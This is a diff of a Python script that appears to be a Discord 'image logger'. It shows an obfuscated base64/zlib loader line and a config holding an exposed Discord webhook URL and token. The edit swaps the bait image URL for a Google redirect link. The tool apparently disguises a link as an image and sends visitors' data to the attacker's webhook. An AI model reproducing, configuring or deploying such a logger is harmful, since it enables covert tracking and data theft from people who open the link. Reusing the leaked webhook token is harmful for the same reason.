@@ -5,7 +5,7 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1440425633673908226/APNpSsnMm63CExRDvrm7SrZHbltn41GABRB3XDlNpm73c4X8i47e0sLuvFaRTSvQBCPf",
-    "image": "https://cdn.discordapp.com/attachments/1438974968682516704/1440416760158228561/IMG_25675.mp4?ex=691e1425&is=691cc2a5&hm=6f4dda6c57b72e509908448efd24f814189a715ed250c4d09b804f668c96727c&",
+    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.intel.la%2Fcontent%2Fwww%2Fxl%2Fes%2Feducation%2Fk12%2Fthe-journey-inside%2Fexplore-the-curriculum%2Finternet.html&psig=AOvVaw37gI4i1ugz5q2T8wKxapQb&ust=1763581723287000&source=images&cd=vfe&opi=89978449&ved=0CBUQjRxqFwoTCJDo8oK8_JADFQAAAAAdAAAAABAE",
     "imageArgument": True,
     "username": "TrackOrd",
     "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
